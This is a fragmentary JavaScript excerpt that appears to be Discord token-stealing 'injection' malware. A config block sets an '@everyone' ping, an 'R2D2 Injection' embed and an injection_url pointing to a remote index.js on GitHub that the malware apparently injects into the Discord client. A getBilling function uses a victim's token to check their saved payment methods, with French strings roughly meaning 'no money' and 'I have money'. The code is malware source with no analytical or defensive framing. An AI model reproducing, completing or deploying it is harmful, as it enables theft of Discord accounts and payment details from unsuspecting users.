...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'R2D2 Injection', 
  embed_icon: 'https://lampes-3d.com/4632-medium_default/r2d2-c3po.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Capenigma/discords/main/index.js', 
  /**
...
const getBilling = async (token) => {
  ...
  if (!data) return 'Pas de thunes';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += 'Je possede des thunes ouai';
          break;
        case 2:
  ...
  if (!billing) billing = 'Pas de thunes';
  return billing;
};
